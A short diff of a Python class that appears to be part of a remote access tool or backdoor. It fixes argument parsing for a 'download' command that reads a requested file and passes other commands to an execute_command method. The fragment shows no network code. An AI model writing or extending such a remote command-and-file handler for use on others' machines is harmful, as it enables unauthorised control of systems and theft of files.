@@ -66,9 +66,9 @@ class ihsanbey:
                 except FileNotFoundError:
                     return print("Eksik dosya ismi / dosya bulunamadı")
             elif command.startswith("download "):
-                command.split(" ")
-                command_result = self.read_file(command[1])
-                print(command_result)
+                wanted_file_command = command.split(" ")
+                print(wanted_file_command)
+                command_result = self.read_file(wanted_file_command[1])
             else:
                 try:    
                     resultt = self.execute_command(command.encode("utf-8"))
